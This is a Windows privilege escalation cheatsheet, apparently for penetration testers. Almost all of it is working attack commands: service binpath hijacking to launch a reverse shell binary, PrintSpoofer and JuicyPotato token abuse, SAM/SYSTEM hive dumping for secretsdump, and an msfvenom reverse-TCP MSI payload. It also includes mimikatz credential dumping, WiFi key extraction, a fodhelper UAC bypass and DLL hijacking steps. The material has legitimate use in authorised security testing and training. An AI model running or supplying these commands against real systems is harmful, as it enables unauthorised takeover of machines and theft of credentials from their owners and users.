# FLLC Windows Privilege Escalation Cheatsheet

## Initial Enumeration

```powershell
# Current context
whoami
whoami /all
whoami /priv
net user %username%
net localgroup administrators

# System info
systeminfo
hostname
wmic os get osarchitecture
```

## Service Exploits

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
accesschk.exe /accepteula -uwcqv "Everyone" *
sc qc "VulnerableService"

# Modifiable service binaries
# Replace the binary or set a new binpath:
sc config VulnerableService binpath= "C:\temp\reverse.exe"
sc stop VulnerableService
sc start VulnerableService
```

## Token Impersonation

```powershell
# Check privileges
whoami /priv

# SeImpersonatePrivilege → PrintSpoofer / JuicyPotato
.\PrintSpoofer.exe -i -c cmd
.\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {CLSID}

# SeBackupPrivilege → copy SAM/SYSTEM
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
# Then: secretsdump.py -sam sam -system system LOCAL
```

## Registry Exploits

```powershell
# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
# msiexec /quiet /qn /i evil.msi

# AutoRun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe
```

## DLL Hijacking

```powershell
# Use Process Monitor to find missing DLLs
# 1. Filter: Result = "NAME NOT FOUND" AND Path ends with ".dll"
# 2. Create malicious DLL with matching name
# 3. Place in application directory or PATH
```

## Credential Harvesting

```powershell
# SAM dump (requires admin)
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system

# Cached credentials
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Saved browser passwords
# Use LaZagne, SharpChrome, or manual SQLite extraction
```

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Fodhelper bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /f
fodhelper.exe

# Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

## Automated Tools

```powershell
# WinPEAS
.\winPEASany.exe

# Seatbelt
.\Seatbelt.exe -group=all

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# SharpUp
.\SharpUp.exe audit
```

---

*FLLC 2026*
